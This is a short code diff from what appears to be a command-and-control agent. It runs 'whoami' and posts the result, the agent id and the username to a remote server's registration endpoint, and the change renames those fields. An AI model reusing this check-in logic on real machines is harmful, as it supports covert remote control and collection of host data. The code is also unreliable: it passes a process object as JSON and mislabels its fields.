@@ -62,7 +62,7 @@ class agents():
         self.whoami = subprocess.Popen("whoami", stdout=subprocess.PIPE)
         self.output += self.result.stdout.read().decode()
         #add info to database
-        r = requests.post(f"{self.server}{self.register_path}", json={"agent_id":self.agent_id, "whoami":self.whoami})
+        r = requests.post(f"{self.server}{self.register_path}", json={"guid":self.agent_id, "hostname":self.whoami, "computername":self.username})
         if r.status_code ==200:
             if r.text == "OK":
                 print("reigstered!")
